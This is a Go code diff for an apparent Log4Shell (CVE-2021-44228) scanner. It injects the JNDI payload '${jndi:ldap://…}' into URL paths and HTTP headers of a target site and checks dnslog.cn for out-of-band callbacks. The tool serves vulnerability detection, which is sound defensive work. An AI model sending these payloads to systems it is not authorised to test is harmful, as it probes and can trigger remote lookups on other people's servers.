@@ -14,7 +14,7 @@ const GETURL = "http://dnslog.cn/getdomain.php"
 const FETCHURL = "http://dnslog.cn/getrecords.php"
 const HEADPATH = "data/headers.txt"
 const PARAMSPATH = "data/params.txt"
-
+const URLPATH = "data/urls.txt"
 
 func ReadHeader(path string) ([]string, error) {
 	file, err := os.Open(path)
@@ -43,18 +43,35 @@ func PostHttp()  {
 	// TODO - Soon
 }
 
+
+func PayloadGetHttpUrl(url string) {
+	client := http.Client{}
+	req , err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		fmt.Println("We have a error : ", err)
+
+	}
+	_, err = client.Do(req)
+	if err != nil {
+		fmt.Println("Please check you site is up or not : ", err)
+		os.Exit(0)
+	}
+}
+
 func PayloadGetHttp(url string, head string ,payload string) http.Header {
 	client := http.Client{}
 	req , err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		fmt.Println("We have a error : ", err)
+
 	}
 	req.Header = http.Header{
 		head: []string{payload},
 	}
 	_, err = client.Do(req)
 	if err != nil {
-		fmt.Println("We have a error : ", err)
+		fmt.Println("Please check you site is up or not : ", err)
+		os.Exit(0)
 	}
 	return req.Header
 }
@@ -102,25 +119,14 @@ func GetHttp(url string, session string) (string) {
 	return bodyStr
 }
 
-
-func main()  {
-
-	var url string
-	progArg := os.Args
-
-	if len(progArg) >= 3 {
-		fmt.Println("Usage : main.go url")
-		os.Exit(0)
-	}
-	url = progArg[1]
-	domain, session :=  GetHttpWithoutSession(GETURL)
+func HeaderScan(domain string, session string, url string)  {
 	headers, err := ReadHeader(HEADPATH)
 	if err != nil {
 		log.Fatalf("Error to read file : %s", err)
 		os.Exit(0)
 	}
 	for i, header := range headers {
-		// TODO - check is not null
+
 		fmt.Println("[+++] Your domain generated : " , domain)
 		fmt.Println("[+++] Your session is : ", session)
 		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
@@ -143,4 +149,56 @@ func main()  {
 			os.Exit(0)
 		}
 	}
+}
+
+func UrlsScan(domain string, session string, url string)  {
+
+	urls, err := ReadHeader(URLPATH)
+	if err != nil {
+		log.Fatalf("Error to read file : %s", err)
+		os.Exit(0)
+	}
+
+	for i, url_pattern := range urls {
+		fmt.Println("[+++] Your domain generated : " , domain)
+		fmt.Println("[+++] Your session is : ", session)
+		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
+		new_url := fmt.Sprintf("%s%s%s", url, url_pattern, payload)
+		PayloadGetHttpUrl(new_url)
+		result := GetHttp(FETCHURL, session)
+		if result == "" {
+			fmt.Println("[***] Payload : ", new_url)
+			os.Exit(0)
+		}
+		if result == "[]" {
+			fmt.Println("[***] Payload : ", new_url)
+			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
+			fmt.Printf("#################### %v ############################", i)
+			continue
+		} else {
+			fmt.Println("[***] Payload : ", new_url)
+			fmt.Println("[***] DNS log result : ", result)
+			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
+			os.Exit(0)
+		}
+	}
+
+}
+
+func main()  {
+
+	var url string
+	progArg := os.Args
+
+	if len(progArg) >= 3 {
+		fmt.Println("Usage : main.go url")
+		os.Exit(0)
+	}
+	url = progArg[1]
+	domain, session :=  GetHttpWithoutSession(GETURL)
+	// TODO - check is not null
+	//HeaderScan(domain, session, url)
+	UrlsScan(domain, session, url)
+
+
 }
